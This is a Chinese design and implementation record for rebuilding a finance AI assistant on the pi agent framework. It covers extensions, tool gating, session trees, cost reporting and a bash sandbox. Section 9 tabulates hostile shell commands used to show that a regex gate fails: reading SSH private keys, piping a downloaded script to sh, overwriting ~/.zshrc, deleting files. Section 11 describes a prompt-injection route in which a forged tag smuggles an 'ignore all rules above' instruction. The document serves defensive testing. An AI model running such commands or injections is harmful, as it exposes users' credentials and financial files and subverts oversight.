# Finwork Pi-native 再架构：把财务助手变成 pi 的宿主

> 版本：v1.0
> 日期：2026-07-30
> 状态：Ideas / 待挑选立项
> 目标函数：**学习优先**——尽可能吃透 pi 与 harness 的全部能力；架构清晰、代码好读、成本可控、易扩展
> 依据：`node_modules/@earendil-works/pi-coding-agent@0.82.1` 的 `docs/` 与 `examples/`（随包发布，一手材料）
> 关联：`design-pi-agent-runtime.md`（现架构 SSOT）、`design-pi-live-session.md`（AR15）

## 0. 这份文档为什么和之前的结论不一样

之前所有「收窄是对的」判断，是按**要发布的财务产品**校准的：ambient 全关、builtin 全关、
自建 Skill loader、不用 extension。在那个目标函数下它们成立。

目标函数换成「学习 pi 的全部 + 架构清晰可扩展」之后，同一批决策里有一半变成了
**提前关掉了教学内容，并且用更多自研代码换来更少的能力**。这份文档按新目标重算。

## 1. 核心判断：接入方向是反的

现状：Finwork 把 pi 当作「配置好再调用的黑盒」——一个 438 行的 `runPiAgent()` 装配函数，
横切关注点（授权、审计、计时、错误映射）全部内联在 tool-adapter 的 `execute` 闭包里。
这是 Claude Agent SDK 的用法。

pi 的设计前提相反：**pi 提供 loop 和宿主骨架，业务以 extension / tool / skill / resource /
provider 的形式插进去**。它随包发布了 76 个 extension 示例和 13 个 SDK 示例，几乎每一个
都在演示「不要包 wrapper，要写 extension」。

所以 Pi-native 的正确形态不是「更好的 runPiAgent」，而是：

> **财务领域本身变成一组 extension**，`lib/agent/pi/` 退化成一个很薄的宿主装配点。

### 用了多少

| pi 能力面 | pi 提供 | Finwork 现用 |
|---|---|---|
| Extension 生命周期钩子 | ~30 个（含 6 个可拦截/可改写） | **0** |
| 内置工具 | 7 个（read/bash/edit/write/grep/find/ls） | **0**（`noTools: "builtin"`） |
| 资源类型 | extensions / skills / prompts / themes / context files | 只用 skills，其余 4 类显式关闭 |
| Session 树 | branch / fork / label / navigateTree / createBranchedSession | **0** |
| Session 替换层 | `AgentSessionRuntime`：newSession / switchSession / fork / import | **0** |
| 运行模式 | InteractiveMode / runPrintMode / runRpcMode | **0** |
| 队列 | steer / followUp | **0**（只映射了 `queue_updated`，从不发） |
| 工具纪律工具箱 | `withFileMutationQueue` 等导出 | **0**（AR6 标「未开始」） |

只读事件订阅（`session.subscribe`）是唯一真正用上的接入点。

## 2. 能力盘点：pi 提供什么 → 你手搓了什么 → 建议

这是本文件的主体。每一行都是一个可独立立项的小切片。

### 2.1 可以直接删掉自研代码的

| pi 能力 | Finwork 现状 | 建议 |
|---|---|---|
| `tool_call` 钩子（**可 block**）+ `isToolCallEventType` | `tool-adapter.ts` 的 `execute` 内联 `authorize()` | 授权迁进 extension。tool-adapter 回归纯 schema/结果转换，从 104 行降到 ~40 行 |
| `tool_result` 钩子（**可改写**） | 无。身份过滤只在 route 层对 `message_delta` 做 | 工具输出的 PII/身份过滤搬到这里——现在工具返回的文本根本没过滤 |
| `before_agent_start`（**可注入消息 + 改 system prompt**） | 每回合重建 ResourceLoader + 重算 systemPrompt | 静态 prompt 缓存一次；记忆/画像/负反馈等动态部分走此钩子。顺带解决每请求 `loader.reload()` |
| `context` 钩子（**可改 messages**） | `fallbackFlatRecap()` 把历史拼成 prompt 文本 | 回顾与裁剪搬到这里，prompt 回归「只有当前用户输入」 |
| `input` 钩子（可拦截/改写/接管） | `injectSkillHint()` 在 query-stages 改消息副本 | 搬到 input 钩子，Query 不再关心 prompt 组装 |
| `withFileMutationQueue`（**已导出**） | AR6「文件写串行化」状态=未开始 | 直接 import。AR6 大半是白拿的 |
| `createReadOnlyTools()` / `tools: [...]` / `excludeTools` | 全关 builtin，自建 `read_document` / `read_file` | 打开只读集（read/grep/find/ls）+ `tool_call` 路径闸。比自研省代码又省 token |
| pi 原生 skills 渐进披露 | 自建 `skill-tool.ts`（因为它依赖 builtin `read`） | 打开 read 后可**整个删掉** `skill-tool.ts` |
| `pi.registerCommand()`（slash 命令） | 无（`noPromptTemplates: true`） | `/月结 2026-07`、`/对账`、`/凭证` ——比自然语言更省更稳 |
| `defineTool()` + TypeBox | 手写 `z.toJSONSchema(...) as TSchema` 强转 | 用 `defineTool` 包一层，保留 Zod 做权威校验，去掉 `as TSchema` 这个类型谎言 |

### 2.2 补上「无落点」的横切能力

`design-pi-agent-runtime.md` §8 列了三项至今无处安放的能力。它们各自都有专门的钩子：

| 欠账 | 钩子 |
|---|---|
| provider 请求/错误 trace | `before_provider_headers` / `before_provider_request`（可替换 payload）/ `after_provider_response`（status + headers，在消费流之前） |
| compaction 审计 | `session_before_compact`（**可取消或自定义**）/ `session_compact` |
| 禁止未接线工具 | `tool_call` + `resources_discover` |

~~顺带：`before_provider_request` 也是修「provider cost 恒 0」的正确位置。~~
**订正（L2 实施时核实）**：`after_provider_response` 只给 status + headers，
`before_provider_request` 只给出站 payload——**这一层看不到 usage**。成本的根因在注册的
费率表（见 §10）；若要事后修补 usage，钩子是 `message_end`（可返回替换后的 message）。
provider 三钩子的真实价值是 trace、限流可见性与 payload 调试。

### 2.3 完全没碰、但对财务场景价值最高的

| pi 能力 | 为什么对你有用 |
|---|---|
| Session 树：`fork` / `branchWithSummary` / `getTree` / `appendLabelChange` / `navigateTree` | 见 §3.1，我认为这是本文件里最大的一条 |
| `AgentSessionRuntime` | `/new`、`/resume`、`/fork`、`importFromJsonl` 的正规入口，带 diagnostics |
| `InteractiveMode` | 同一套工具/skills 的第二个前端，见 §3.2 |
| `runRpcMode` + RPC 协议 | Tauri 壳直接讲 JSON-RPC，见 §3.5 |
| `steer` / `followUp` | 运行中插话。AR10 E7 已验证可用，缺的只是长活 session（AR15） |
| `pi.registerProvider()` 在 extension 里（含 async 工厂动态发现模型） | 多 provider / 本地模型，`examples/extensions/custom-provider-*` 有完整实现 |
| `pi.events` 事件总线 | 扩展之间协作，不用互相 import |
| `pi.appendEntry()` | 扩展状态随 session 持久化（与 SQLite 那本账仍分开） |
| pi packages（`npm:` / `git:` 分发） | 技能和扩展可以发包，而不是只能内置 |
| `ctx.ui.custom()` + pi-tui 组件 | 自定义渲染与交互组件 |

### 2.4 值得对照学习（不一定改）

| pi 的做法 | 你的做法 | 对照点 |
|---|---|---|
| `examples/extensions/subagent/`：**每个子代理 spawn 独立 pi 进程** + JSON 模式取结构化输出 + 单/并行/chain 三模式 + 并发上限 + token 统计 + TUI 渲染；agent 定义放 `agents/` 目录 | 进程内 `AgentSession` + `SubagentTask` 合同 + 角色写在 TS 常量里 | 进程隔离 vs 进程内；**agent 定义文件化**（你的 ROLE_REGISTRY 可以变成文件，用户自己加角色） |
| `structured-output.ts` | 自建 CompletionEvidence / TaskContract | 结构化交付的两种范式 |
| `custom-compaction.ts` / `summarize.ts` / `trigger-compact.ts` | 只映射 `compaction_end` | 压缩摘要的组织方式 |
| `permission-gate.ts` / `protected-paths.ts` / `confirm-destructive.ts` / `timed-confirm.ts` / `sandbox/` | 自建 risk registry + 确认卡 + session trust | **你说的「安全靠扩展实现」，pi 给了 5 个可运行范例** |
| `git-checkpoint.ts` / `dirty-repo-guard.ts` | 无 | 「每回合可回退」的实现范式，可迁移到「凭证草稿可回退」 |
| `handoff.ts` | `propose_transfer` 越权转交 | 同一问题的两种解法 |
| `todo.ts` / `plan-mode/` | 自建 run-contract | 任务分解与计划模式 |
| `dynamic-tools.ts` / `tool-override.ts` | `context-policy.ts` 静态子集 | 动态工具装载 vs 预先算白名单 |

## 3. 高杠杆想法（详述）

### 3.1 Session 树 = 财务审计的天然数据模型　★最推荐

会计工作的本质形状就是分支：「按 A 口径算 / 按 B 口径算」「含税 / 不含税」
「这批单据归 6 月 / 归 7 月」。

现在的实现里，用户想比较两种处理方式，只能新开一个会话把单据重新贴一遍——上下文、
已确认的口径、已读的知识库全部重来。

pi 的 session 本来就是 `id`/`parentId` 的树，且提供：

- `sm.branch(entryId)` —— 把叶子移回某个更早的节点
- `sm.branchWithSummary(id, "...")` —— 带上下文摘要分支
- `sm.appendLabelChange(id, "已复核")` —— 给节点打标签
- `sm.createBranchedSession(leafId)` —— 把一条路径抽成独立文件
- `session.navigateTree(targetId, { summarize: true })` —— 原地导航并生成摘要
- `runtime.fork(entryId, { position: "at" })` —— 克隆当前路径

映射到产品语言：

| pi 概念 | 财务语义 |
|---|---|
| fork at entry | 「从『确认科目映射』这一步另起一种算法」 |
| label | 「此处报表已人工复核」——天然的 checkpoint |
| branchWithSummary | 分支时带走口径与已确认事实，不用重贴单据 |
| createBranchedSession | 把某个方案抽成独立留档 |
| getTree | 「这份报表是怎么算出来的」的可视化 |

这是「用 pi 的原生能力换掉一个产品级难题」，成本主要在 UI，运行时几乎白拿。

### 3.2 让 pi 的 TUI 成为第二前端　★学习收益最高

同一份 `customTools` + ResourceLoader，喂给 `InteractiveMode`，得到一个终端版 Finwork。

为什么值得做：

1. **立刻分清**哪些能力是 pi 白给的、哪些是你 Web UI 自己实现的——这是最快的认知校准。
2. **最好的调试台**：不用起 Next、不用点浏览器，直接和 45 个财务工具对话。
3. 白拿 pi 的 `/model`、`/compact`、`/tree`、`/resume`、`/fork` 等全部内置命令，
   等于免费获得一套 session 管理 UI。
4. 暴露你目前所有「Web-only」的隐含假设（比如确认卡只有前端实现，TUI 下会怎样）。

代价很小：一个 `scripts/finwork-tui.mts`，复用现有装配代码。

### 3.3 成本与配额下沉到 provider 钩子

现在：`totalCostUsd` 因为模型元数据 cost 全 0 而恒为 0；配额在 Query Pipeline 的
`quotaStage` 里按自有口径算。

Pi-native：`before_provider_request` / `after_provider_response` 是**每一次真实模型调用**的
唯一必经之路，适合放 trace、限流可见性与 payload 调试。

**但成本不在这一层**（L2 实施时核实：这两个钩子都看不到 usage）。成本的根因是注册给 pi 的
费率表，已在 §10 处理；要做「按会话硬预算」，累计用量得从 `message_end` 取，硬停仍落在
Query Pipeline 既有的 `quotaStage`（回合前拦截，语义比回合中途掐断干净）。

### 3.4 财务专属 compaction

`session_before_compact` 可取消或自定义。财务对话压缩时最不能丢的是：**口径、科目映射、
期间、金额、已确认事实**。默认摘要不知道这些重要。

AS0-19 已经证明你在意这件事（压缩后要保住「不含税收入」和 `(实际-预算)/预算`）。
自定义 compaction 是把那次验证变成机制的地方。

### 3.5 RPC 模式：一种极端清晰的架构

`pi --mode rpc` / `runRpcMode(runtime)`：pi 作为独立进程，讲 JSON-RPC。
Tauri 的 Rust 壳直接和它对话，Next 只负责 UI。

这条路把「Agent 运行时」和「Web 应用」彻底解耦：崩溃隔离、可单独重启、可用任何语言写客户端。
对「成本低、好控制」是很强的答案。**但它和现在的 Next API 路由架构冲突**，
属于「值得起一个 spike 试，不一定采纳」。

### 3.6 角色定义文件化

pi 的 subagent 示例把 agent 定义放在 `agents/` 目录（配 `prompts/`）。你的 ROLE_REGISTRY
是 TS 常量，加角色要改代码、要重编译。

变成文件后：与 skills 同构、用户可自建角色、可随 pi package 分发、可热重载。
这条和记忆里「智能体菜单做强」的方向一致。

## 4. 目标架构

```text
app/api/agent/query/route.ts          ← 只做 HTTP/SSE/落库/终态收口
        │
        ▼
lib/agent/host.ts                     ← 薄装配：拼 session，不含业务
        │
        ├── extensions/authorize.ts    ← tool_call：风险/角色/确认
        ├── extensions/redact.ts       ← tool_result + message：PII/身份
        ├── extensions/context.ts      ← before_agent_start + context：记忆/画像/回顾
        ├── extensions/provider-meter.ts ← provider 三钩子：成本/配额/trace
        ├── extensions/compaction.ts   ← session_before_compact：财务摘要
        ├── extensions/lifecycle.ts    ← session_start/shutdown：资源与清理
        ├── extensions/commands.ts     ← /月结 /对账 /凭证
        └── extensions/finance-tools.ts ← 45 个工具的注册（handler 不变）
        │
        ▼
Pi AgentSession（长活，AR15）
```

判断标准：**每个 extension 能被单独读懂、单独测试、单独关掉**。这正是「架构清晰、
代码好读、好扩展」的可操作定义。现在的 `agent-service.ts`（438 行装配 + 内联横切）
做不到其中任何一条。

## 5. 分批路线

每批只引入一个 pi 概念，都能跑起来，都交付一个真功能。

| 批次 | 引入的 pi 概念 | 交付 | 依赖 |
|---|---|---|---|
| L1 | extension + `tool_call` + 自构造内置工具 | **已 ship（2026-07-30）**，见 §8 | 无 |
| L2 | `before_provider_*` | provider trace + **诚实成本**（见 §10，「修 cost 恒 0」的提法已订正） | L1 | **已 ship（07-31）** |
| L3 | `before_agent_start` / `context` | 提示词分段（AR15b 前置）+ 历史真消息回放（见 §11） | L1 | **已 ship（07-31）** |
| L4 | builtin 只读工具 + 路径闸 | 打开 grep/find/ls + 技能目录只读放行，删掉自建 `skill-tool.ts`（见 §12） | L1 | **已 ship（08-03）** |
| L5 | `InteractiveMode` | 终端版 Finwork（调试台 + 认知校准） | L1 | **暂缓（用户决定）** |
| L6 | 在途 session 注册表 + provider 缓存 | 运行中插话；**AR15 的长活 session 决策已推翻**（见 §13） | L1 | **已 ship（08-03）** |
| L7 | session 树 | 方案分支/复核 checkpoint/算法溯源 | L6 | **已 ship（08-03）** |
| L8 | `session_before_compact` | 财务专属压缩摘要（见 §14） | L3 | **已 ship（08-03）** |
| L9 | `registerCommand` | `/月结` 等工作流命令 | L1 | **已 ship（08-03）** |
| L10 | `withFileMutationQueue` | AR6 收尾 | 无 |
| S1 | `runRpcMode`（spike） | 试，不一定采纳 | — |

L1 是关键：它建立 extension 这个落点，后面 8 批都挂在上面。

## 6. 不建议做的

- **为了「用上」而用上**：themes、贪吃蛇/扫雷类示例、modal-editor 这些对你没有产品意义。
  学习价值靠 §3 那几条足够。
- **一次全改**：现在测试门刚补齐（P1/P2），先用 L1 验证「extension 化」这条路真的让代码变薄，
  再往下推。
- **把 handler 塞进 extension**：extension 承载横切，财务 handler 仍归 Finwork。
  这条铁律在新目标下依然成立。
- **删掉 `AgentRuntimeEvent`**：公共事件合同是这次迁移最值钱的产出。extension 化只改
  事实产生的位置，不改对外协议。

## 7. 关于「安全靠后」

绝大部分我同意，而且 pi 明确支持这个思路——`permission-gate.ts`、`protected-paths.ts`、
`confirm-destructive.ts`、`timed-confirm.ts`、`sandbox/` 五个可运行范例都在演示
「安全是扩展关心的事」。审批流、双人复核、审计留痕、风险分级全部可以后置，不影响架构。

有一条我建议即使在学习模式下也一起做，因为它成本几乎为零：**打开 `bash`/`write`/`edit`
的同时，用 `tool_call` 钩子加一个工作目录约束**。

理由不是流程合规，是这个 app 处理的是你**真实的账务文件和凭证**。builtin 写工具没有目录
约束时，一次模型误判就能改到真账本，而且没有 undo。`permission-gate.ts` 的形状照抄，
五行就够：

```ts
pi.on("tool_call", async (event) => {
  if (!isWriteLike(event.toolName)) return;
  if (!isInsideAllowedRoots(event.input)) {
    return { block: true, reason: "路径不在允许的工作目录内" };
  }
});
```

L4 打开只读工具时甚至不需要它（只读无破坏性）。真正需要它的是打开 `write`/`edit`/`bash`
那一步——那时顺手加上，比事后补便宜得多。其余安全能力，靠后没问题。

> **上面这段对 bash 是错的，实施时已证伪（见 §9）。** `tool_call` 路径闸对
> `write`/`edit`/`read` 成立，因为路径是**入参**，能直接校验；bash 的入参是一段
> **程序**，在字符串上做判断拦不住等价改写。实测那五行的加强版（5 条破坏性正则）
> 漏过 8/10。bash 的工作目录约束只能来自 OS 沙箱。留着这段原文是为了记住这个判断
> 是怎么错的：**把「参数校验」的直觉套到「代码执行」上**。

## 8. L1 实施记录（2026-07-30，已 ship）

### 与原计划的偏差：授权**没有**迁出 tool-adapter

原计划写的是「授权迁出 tool-adapter」。实施时读 pi 文档发现不能这么做：

> `tool_call` … **No re-validation is performed after your mutation**

`tool_call` 在 execute 之前触发，拿到的是模型产出的裸入参；而财务工具的权威校验是
tool-adapter 里的 `z.parseAsync`（含 AR3b 的 `jsonCoercible` 预处理）。把风险判定挪到 Zod
之前，就会重演 `spike-tool-gate-findings.md` E2b 记录过的绕过——**pi 里存在与 Claude SDK
`canUseTool` 同构的陷阱**。

因此分工定为：

| 工具类别 | 授权位置 | 理由 |
|---|---|---|
| Pi 内置 read/write/edit/bash | extension 的 `tool_call` | 不经 tool-adapter，这是唯一挂点；入参是裸字符串，无 Zod 变换 |
| 45 个财务工具 | tool-adapter，`z.parseAsync` 之后 | 保住权威校验顺序 |

L1 的真实价值不是「搬代码」，而是**建立 extension 落点**（L2–L9 全挂在上面）并补上
内置工具此前完全缺失的授权。

### 顺带发现：path-safety / read-guard 在生产里从未触发

`createPathSafetyHook()` 与 `createReadGuardHook()` 比对的是 `"Write"`/`"Edit"`/`"MultiEdit"`/
`"Read"`——**Claude SDK 的内置工具名**；`getToolFilePath()` 读的是 `input.file_path`——
**Claude SDK 的参数名**。而 `authorize.ts` 传入的是 `definition.id`
（`*`），入参也是财务工具自己的形状。名字和形状**两层都不匹配**，
两个 hook 在生产中恒返回 `allow`。

`tests/injection-defense.test.ts` 直接用 `toolName: "Write"` 单测 hook 逻辑，所以它一直是绿的
——**单测绿、生产死**。这正是记忆 `wire-dormant-code-verify-behavior` 的形态。

Pi 的内置工具名是小写 `write`/`edit`/`read`，参数名是 `path`（edit 为 `{path, edits[]}`）。
L1 把闸绑到这套真实名字上，等于第一次让这段保护真正生效。

### 实现

| 文件 | 职责 |
|---|---|
| `lib/agent/tools/path-policy.ts`（新） | `isInsidePath` / `isDeliveredPath` 的单一真相；`hooks/built-in.ts` 改为从这里 import，删掉私有副本 |
| `lib/agent/pi/builtin-tools.ts`（新） | 用 `create{Read,Write,Edit,Bash}ToolDefinition(cwd)` 按会话目录构造内置工具；bash 用 `spawnHook` 钉死 cwd |
| `lib/agent/pi/extension.ts`（新） | `createFinworkExtension()` + 纯函数 `evaluateBuiltinToolCall()`；`tool_call` 拦截并发 `run_blocked` |
| `lib/agent/pi/resource-loader.ts` | 透传 `extensionFactories` |
| `lib/agent/pi/agent-service.ts` | 装配 extension + 内置工具 |

两层防护，边界诚实：

1. **构造层（结构性）**：工具的 cwd 是会话目录 → 相对路径无法逃逸。
2. **闸层（判据）**：`tool_call` 查绝对路径越界、`delivered/` 不可变、bash 破坏性命令。

**不是沙箱**：bash 的 cwd 钉死只约束相对路径，`cd /` 加绝对路径仍可能越界；破坏性命令
用的是 pattern 判据（照 pi `permission-gate.ts`），能挡明显误伤，挡不住刻意绕过。
真沙箱见 pi 的 `examples/extensions/sandbox/`，属后续批次。

### 作用域

- 只在**主 Agent**开内置工具。子代理仍 `noTools: "builtin"`：角色白名单
  （`resolveRoleAllowedTools`）里只有财务工具 id，给角色开内置工具会绕过角色权限模型。
- **没动 skills**：`skill-tool.ts` 保留。`read` 打开后 pi 原生渐进披露理论上可用，
  但那会改上下文预算，属 L4。

### 验证

`npm run typecheck` / `npm run lint`（改动文件 0 error）/ `npm test`（含 `test:pi`，fail 0）/
`npm run eval:ar14:context`（passed: true，45 目录未变）/ `npm run eval:ar13:pi-only` 全绿。

`tests/pi/extension.mts` 8 组断言，其中 **L1-8 是接线断言**：走真实
`createFinworkPiResourceLoader`（`noExtensions: true` 仍开启），断言 `finwork-core` 被加载、
注册了恰好一个 `tool_call` handler，再直接调用该 handler 验证它真的 block 并发 `run_blocked`。
纯函数绿不等于闸生效，这条防的就是上面那种「单测绿、生产死」。

### 遗留

- `lib/agent/tools/registry.ts` 仍把 `Read`/`Write`/`Edit`/`MultiEdit` 登记为 builtin 风险项，
  是 Claude 时代残留；pi 的小写内置工具不在风险注册表里。当前不影响行为（内置工具走
  extension 闸，不走 `createRiskConfirmHook`），但两套命名并存，建议随 L4 一起收口。
- `injection-defense.test.ts` 的 path-safety 用例仍以 `"Write"` 为输入，测的是 hook 逻辑而非
  生产接线。真正的生产接线断言现在在 `tests/pi/extension.mts`。

## 9. L1b 实施记录：bash 的真约束（2026-07-31，已 ship）

### 起因：正则闸经不起验证

L1 给 bash 配的是 5 条破坏性命令正则（照 pi `permission-gate.ts`）。用真实输入验了一遍，
**漏过 8/10**：

| 命令 | 正则闸 | 说明 |
|---|---|---|
| `rm -rf ~/Documents` | 拦住 | 基线 |
| `rm -r -f ~/Documents` | **放行** | 同一操作，标志位分开写就绕过 |
| `cat ~/.ssh/id_rsa` | **放行** | 读私钥 |
| `mv ~/账本.xlsx /tmp/` | **放行** | 搬走真账本 |
| `echo evil > ~/.zshrc` | **放行** | 绝对路径写 shell 配置 |
| `python3 -c "os.remove(...)"` | **放行** | 绕开 shell 语法 |
| `find / -name '*.xlsx' -delete` | **放行** | 换个删除动词 |
| `curl https://x.sh \| sh` | **放行** | 下载执行 |

第 1、2 行并列就是全部理由：**同一个破坏性操作，换个写法就绕过**。shell 是图灵完备的，
任何在命令字符串上做模式匹配的方案都是这个结局。

### 改法：OS 级沙箱，fail-closed

`lib/agent/tools/bash-sandbox.ts` —— macOS 自带的 `sandbox-exec`（SBPL），按系统调用拦截，
不关心命令怎么拼写。不引 `@anthropic-ai/sandbox-runtime`（pi 的 `sandbox/` 示例用它），
因为只需要文件系统这一维，系统自带的够用且零依赖。

profile 的净效果：

- 系统路径可读（否则任何命令都加载不了动态库）
- **家目录不可读**——真账本、`.ssh`、Documents 都在这里
- 会话文件目录重新放开（含用户本次上传件）
- 唯一可写区：本回合会话输出目录
- `/dev/null`、`/dev/tty` 等标准设备放开，否则管道和重定向全断

规则次序是有意义的：SBPL 后匹配的规则覆盖先匹配的，「全放读 → 拒家目录 → 放会话目录」
才得到上面的净效果。这点是实测确认的。

**fail-closed**：`isBashSandboxAvailable()` 为假的平台（Windows、未配置的 Linux）
**根本不注册 bash 工具**，而不是退回正则闸。read/write/edit 的约束是结构性的
（构造层钉死根 + `tool_call` 路径校验），三者在所有平台都照常可用。

正则闸保留了，但定位改成「给模型一句可读的早期反馈」——`拒绝执行破坏性命令` 比内核抛的
`Operation not permitted` 好懂。它不是边界，注释里已写明。

### 踩到的两个坑（都会造成假绿灯）

1. **`/tmp` 是 `/private/tmp` 的软链**。profile 里写未解析的路径会得到一个「看起来配了、
   实际不匹配」的沙箱——第一版的表现是**允许区反而被拒**。路径必须 `realpathSync.native`
   之后再进 profile。
2. **`rm -f` 无法 stat 时同样返回 0**。用退出码判断「有没有被拦住」会得到假绿灯：探针
   两次报 `LEAKED`，实际文件都好好的。`tests/pi/bash-sandbox.mts` 的判据一律是
   **靶文件仍在、内容未变**，不看退出码。

### 验证

`tests/pi/bash-sandbox.mts`（darwin 门控，已进 `test:pi`）跑**真实 sandbox-exec**：
正常管道/重定向/读写不受影响；上表 8 条越界全部被拦；命令含单引号时包装转义正确。
另做了变异验证——同样的 `rm -r -f` 不经沙箱执行，靶文件确实被销毁，确认这些断言承重。


## 10. L2 实施记录（2026-07-31，已 ship）

### 订正：「修 cost 恒 0」这个立项说法本身是错的

原表述把它当成算错了。读完代码才发现根因不同：`provider.ts` 对**所有**模型写死
`cost: {input:0, output:0, cacheRead:0, cacheWrite:0}`，而 Finwork 的模型与网关**都是
用户自填的**——我们根本无从知道价格。

所以真正的缺陷是：**把「未知」报成了「零」**。`$0.00` 会让用户以为这次运行不花钱。
在财务应用里，这个性质比「数字不准」更差。

**因此没有内置价格表**：编一张自己无法核实的价格，比没有价格更糟。改为：

- `lib/agent/pi/model-catalog.ts`：费率与上下文上限由用户在 settings 声明
  （`modelPricing`，单位 USD/百万 token——与 pi-ai 的 `Model.cost` 同单位，其内部除以 1e6，
  已核实源码而非照文档推断）。
- 声明了 → 注册进 pi，由 pi 自己算真实成本。
- 未声明 → `totalCostUsd` 报 `undefined`（落库为 `null`），**不退化成 0**。
  数据层本来就支持 null（`trace-write.ts` 早有 `?? null`），是 agent-service 永远给出 0。
- **费率缺项判整体未知**：只填 input/output 而漏掉 cache 两项时，那两维会静默按 0 计——
  同一个「未知伪装成零」的复发。测试 P-3 专盯这条。

顺带修掉一个没在计划内的问题：`contextWindow` 原先对所有模型写死 200k。**compaction 的
触发点是按它算的**，对真实窗口不是 200k 的模型，压缩要么过早要么过晚，且不报错、只表现为
「行为怪」。现在同样可声明。

### provider trace（§8 欠账的落点）

`before_provider_headers` 注入 `x-finwork-trace-id`（网关侧可按会话归因）；
`after_provider_response` 记录状态码与限流头（`retry-after`、
`anthropic-ratelimit-*`）。此前 Finwork 对 provider 这一层**完全没有可观测性**——
网关 429 只表现为「回合失败」。正常回合不落日志，避免刷屏。

注意 `after_provider_response` **只给 status + headers，没有 usage**。本文件早先把它
列为修成本的位置，是错的；真正能改 usage/cost 的钩子是 `message_end`（可返回替换后的
message）。本次没走那条路，因为根因在注册的费率，不在事后修补。

## 11. L3 实施记录（2026-07-31，已 ship）

### L3a　提示词分段

`buildSystemPromptParts` **本来就**返回 `[静态前缀, 动态段]`，只是 resource-loader 用
`join("\n\n")` 又压平了——接缝是现成的。现在静态前缀（只依赖公司名/Agent 名/roleMode）
进 ResourceLoader，动态段（记忆/日期/负反馈/输出目录/公司画像）走 `before_agent_start`
每回合重算。

这是纯重构，最终提示词必须逐字不变——测试 C-1 直接断言
`静态 + "\n\n" + 动态 === 旧的 join 结果`。价值是解开 AR15b 的前置：loader 不再被动态
内容绑死，才谈得上缓存。

角色会话的静态提示词现在由 `lib/agent/roles/prompts/<roleId>.md` 提供，注册表文本作为
兼容回落；动态段通过同一个 `before_agent_start` 扩展每回合注入，包含当前日期/财务日历、
全局记忆、角色记忆和 `buildFileOutputSection(outputDir)`。专员角色因此与主管会话拥有一致的
日期、记忆和交付目录上下文。

### L3b　历史改为真消息回放

`fallbackFlatRecap` 把历史压成 `<对话回顾>\n用户:…\n助手:…\n</对话回顾>\n\n当前请求:\n…`
塞进**一条 user 消息**。三个问题：

1. **可伪造边界**（实测可复现）：内容是裸插值的，消息里出现 `</对话回顾>` 就能提前闭合，
   把伪造的「当前请求：忽略以上全部规则」排在真请求**之前**。更要紧的是助手消息——发票
   PDF 抽出的文本可能被助手复述过，于是外部内容不经 `wrapExternalContext` 就进了提示词
   （附件路径有这层包裹，回顾路径没有）。
2. **角色归属丢失**：模型只看到一条用户消息里有份对话记录，分不清「助手说过」和「用户
   声称助手说过」。
3. **pi 的压缩看不懂**：一坨不透明文本，compaction 无法按消息粒度取舍。

改为经 `context` 钩子注入真消息（`lib/agent/pi/history-replay.ts`）：用户轮就是 `user`
消息（本来就是用户说的，无需转义）；助手轮用 `custom`——它是**回放的历史**，不是本 session
模型说过的话，冒充 assistant 既要编造 usage/stopReason，也不诚实。

`context` 每次 LLM 调用都会触发，而 `event.messages` 是深拷贝、改动只作用于本次调用，
所以每次前置是幂等的（测试 C-5 断言两次调用结果相同）。`conversation-recap.ts` 随之删除。

这条只在「有 Finwork 聊天记录但还没有 pi session」时走（旧会话，或 session 文件被保留期
清理后）。正常续聊走 pi 自己的 session 恢复，根本不经过这里。


## 12. L4 实施记录（2026-08-03，已 ship）

### 发现：渐进披露一直是断的

自建 `Skill` 工具把 `baseDir` 告诉模型、让它去看 `references/`、`scripts/`，
**但模型没有任何工具读得到那些文件**——读闸只放行会话目录。实测三类技能文件全被拒。

仓库里有 **216 个非 SKILL.md 的技能文件**，5 个 SKILL.md 明确引用它们。也就是说这套
「按需加载」从来没真正生效过，模型只能看到 SKILL.md 正文里那段路径提示。

### 改动

- 加 `grep`/`find`/`ls`（三者与 `read` 同为读类，`path` 字段名一致，闸可统一处理）。
- `FinworkBuiltinRoots` 加 `skillRoots`，读类工具在会话目录之外**额外**放行技能根（只读）。
  放行是显式的：不传 `skillRoots` 仍然拒绝。写类不受影响，往技能目录写仍被拒。
- `grep`/`find`/`ls` 的 `path` 可省略（省略即落在构造时的会话 cwd），闸不再对它们要求 path；
  `read`/`write`/`edit` 省略 path 仍必须拒绝——否则可以靠省略参数绕闸。
- 删掉自建 `Skill` 工具，清单改为带 SKILL.md 绝对路径 + 指明用 `read` 加载。

### 顺带订正一处夸大

`builtin-tools.ts` 原注释称按会话目录构造让「相对路径无法逃逸」成为**构造层的结构性事实**。
核实 pi 源码：这个参数在工具内部叫 `cwd`，只经 `resolveToCwd` 做相对路径解析，
**绝对路径与 `../` 都直接放行**。真正的边界只有 `tool_call` 闸和 bash 的 OS 沙箱。
注释已改——这正是 L1b 批评过的那种虚假安全感。

## 13. L6 实施记录（2026-08-03，已 ship）：推翻了 AR15 的核心决策

`design-pi-live-session.md` 的核心决策是「Session 活过单个 HTTP 回合」。实施前逐条核实收益：

| 原列收益 | 核实结果 |
|---|---|
| compaction 连续性 | **不成立**。`SessionManager.appendCompaction()` 把压缩条目写进 JSONL，重开即恢复（已读 pi 源码）。 |
| 免掉每回合 `loader.reload()` / 重注册 provider | 真实，但不需要长活 session。provider 按指纹缓存即可；loader 实测重建 **~7ms**（首次 1054ms 是模块冷加载），对比数秒的模型调用是 0.1% 量级。 |
| 运行中插话 | 真实，但插话是往**正在跑**的 session 注入。回合结束后 session 已 idle，没有什么可插——需要的是**在途**注册表。 |

代价则被低估：跨回合持有要求 `emit`、`traceId`、`resolveUserQuestion`、`onSubagentEvent`
全改成经可变「当前回合上下文」间接引用。这条路径每条消息都走，指错一次就会让事件串进
**另一个会话的 SSE 流**。

**结论**：三条收益里一条不成立、两条能用更小且各自安全的改动拿到，因此不做跨回合持有。
落地为 `live-sessions.ts`（在途注册表，解锁 steer/followUp）+ provider 指纹缓存。
ResourceLoader 明确不缓存——7ms 不值得换事件串流风险。

注册表有一处容易写错的地方：后开的回合会覆盖同一会话的条目，**先结束的回合注销时不能把它删掉**，
否则插话会打进一个已经结束的 session。实现里靠「只删自己那条」保证，测试 S-3 专盯这条。

## 14. L8 实施记录（2026-08-03，已 ship）

财务对话压缩时最不能丢的是**口径、期间、科目、具体金额**——恰恰是摘要最容易抹平的东西。

做法是两段拼接：`compaction-facts.ts` 用规则**确定性**提取金额（必须带币种/单位，否则订单号、
年份会被误判）、期间、口径关键词命中的原句，组成 `<关键事实>` 块；叙述交模型生成
（`compaction-summarizer.ts`，形状照 `conversation-title.ts` 直接打网关，不碰 pi-ai 内部）。
事实块在前，叙述在后。

